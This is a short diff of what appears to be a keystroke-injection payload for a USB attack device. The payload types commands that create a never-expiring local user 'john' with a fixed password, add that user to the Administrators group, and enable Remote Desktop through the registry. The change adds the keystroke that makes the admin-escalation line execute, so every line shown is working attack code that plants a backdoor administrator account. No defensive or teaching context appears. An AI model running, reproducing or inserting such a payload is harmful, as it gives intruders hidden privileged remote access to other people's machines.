@@ -11,6 +11,7 @@ STRING NET USER john P@ssw0rd /add /y /expires:never
 ENTER
 DELAY 1000
 STRING NET LOCALGROUP Administrators john /add
+ENTER
 DELAY 1000
 STRING Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\‘ -Name “fDenyTSConnections” -Value 0
 ENTER
